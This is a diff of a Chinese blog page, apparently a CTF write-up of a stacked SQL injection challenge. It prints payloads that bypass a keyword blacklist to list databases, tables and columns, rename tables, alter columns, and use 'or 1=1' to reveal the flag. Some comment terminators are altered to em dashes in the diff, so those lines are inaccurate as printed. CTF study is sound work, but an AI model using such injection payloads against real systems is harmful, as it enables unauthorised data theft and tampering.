@@ -412,15 +412,14 @@
 <p><a href="https://blog.csdn.net/weixin_45551083/article/details/105389126" target="_blank" rel="noopener">https://blog.csdn.net/weixin_45551083/article/details/105389126</a></p>
 <p><a href="https://blog.csdn.net/qq_26406447/article/details/90643951" target="_blank" rel="noopener">https://blog.csdn.net/qq_26406447/article/details/90643951</a></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(<span class="string">"/select|update|delete|drop|insert|where|\./i"</span>,$inject);</span><br></pre></td></tr></table></figure>
-
 <p>select/update/delete/drop/insert/where过滤</p>
 <p>无法使用union联合查询，使用堆叠注入</p>
-<p>查看数据库 ?inject=1’ ;show databases–+</p>
+<p>查看数据库 ?inject=1’ ;show databases—+</p>
 <p>查看表 ?inject=1’ ;show tables-+</p>
-<p>查看列  ?inject=1’ ;show columns from words–+</p>
+<p>查看列  ?inject=1’ ;show columns from words—+</p>
 <p> 注意：查看列的时候要注明 from哪个表</p>
 <p>查询1919810931114514表中所有列</p>
-<p>?inject=1’ ;show columns from `1919810931114514`–+</p>
+<p>?inject=1’ ;show columns from `1919810931114514`—+</p>
 <blockquote>
 <p>关于反引号：表名、字段、数据库名等标识符可用反引号 `  。<br>标识符也可以不使用反引号，但如果标识符包含特殊字符或保留字，则必须使用。</p>
 <p><img src="/2020/07/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8-%E5%BC%BA%E7%BD%91%E6%9D%AF/image-20200730092402760.png" alt="image-20200730092402760"></p>
@@ -430,8 +429,8 @@
 <p><strong>alter table</strong>s</p>
 <p><img src="/2020/07/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8-%E5%BC%BA%E7%BD%91%E6%9D%AF/image-20200730093600749.png" alt="image-20200730093600749"></p>
 <p><img src="/2020/07/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8-%E5%BC%BA%E7%BD%91%E6%9D%AF/image-20200730093702863.png" alt="image-20200730093702863"></p>
-<p>?id=1’;rename tables`words` to `aaa`;rename tables `1919810931114514` to `words`;alter table `words` add `id` int(10);alter table`words` change `flag` `data` varchar(100)–+</p>
-<p>?id=1’ or 1=1–+</p>
+<p>?id=1’;rename tables`words` to `aaa`;rename tables `1919810931114514` to `words`;alter table `words` add `id` int(10);alter table`words` change `flag` `data` varchar(100)—+</p>
+<p>?id=1’ or 1=1—+</p>
 <p>得到flag</p>
 <h4 id="关于是否修改flag为data"><a href="#关于是否修改flag为data" class="headerlink" title="关于是否修改flag为data"></a>关于是否修改flag为data</h4><p>看了很多wp,发现不用修改列名也能得到flag</p>
 <p>或者直接把flag改为id也可以</p>
@@ -440,7 +439,7 @@
 <p>之前猜测的内部查询语句是</p>
 <p>select id,data from words where id=</p>
 <p>结果有出入，推测 select * from words where id=</p>
-<h4 id="答疑"><a href="#答疑" class="headerlink" title="答疑"></a>答疑</h4><p>1.为什么最后得到flag需要or 1=1，直接查询1’–+不行</p>
+<h4 id="答疑"><a href="#答疑" class="headerlink" title="答疑"></a>答疑</h4><p>1.为什么最后得到flag需要or 1=1，直接查询1’—+不行</p>
 <p>插入id列后 查找不到id=1 需要or 1=1通过验证</p>
 <p>2.为什么这条语句直接查询1 可以得到flag</p>
 <p>1’;rename table `words` to `word1`;rename table `1919810931114514` to `words`;alter table `words` add id int unsigned not Null auto_increment primary key; alert table `words` change `flag`  `data` varchar(100);#</p>
@@ -477,7 +476,8 @@
       <blockquote>
         
           
-            博客内容遵循 署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议
+            <p>博客内容遵循 署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</p>
+
           
         
           
@@ -773,7 +773,8 @@ https://www.jianshu.com/p/79a225c2650e
       
     
       
-        <div>Blog content follows the [Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</div>
+        <div><p>Blog content follows the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
+</div>
       
     
       
@@ -787,7 +788,8 @@ https://www.jianshu.com/p/79a225c2650e
     
       
         <div class='copyright'>
-        [Copyright © 2017-2020 Mr. X](https://xaoxuu.com)
+        <p><a href="https://xaoxuu.com" target="_blank" rel="noopener">Copyright © 2017-2020 Mr. X</a></p>
+
         </div>
       
     
